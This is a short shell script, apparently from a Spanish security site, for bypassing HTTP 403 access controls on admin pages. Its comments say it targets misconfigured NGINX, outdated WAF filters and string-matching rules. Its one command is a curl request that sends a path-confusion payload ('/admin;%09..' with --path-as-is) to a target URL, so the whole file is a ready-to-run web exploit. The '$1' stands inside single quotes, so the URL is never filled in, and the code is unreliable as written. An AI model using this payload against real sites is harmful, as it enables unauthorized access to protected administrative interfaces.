# bypass 403 hackingyseguridad.com 2026 
# Configuraciones mal hechas en NGINX + backend legacy
# Filtros WAF obsoletos
# Reglas basadas solo en coincidencia de strings
# @antonio_taboada
# Usp: 
# sh 403bypass1.sh  https://pagina.com/admin

curl -vvv -k -s -I --path-as-is -X GET '$1/admin;%09..' -H 'User-Agent: Mozilla/5.0'
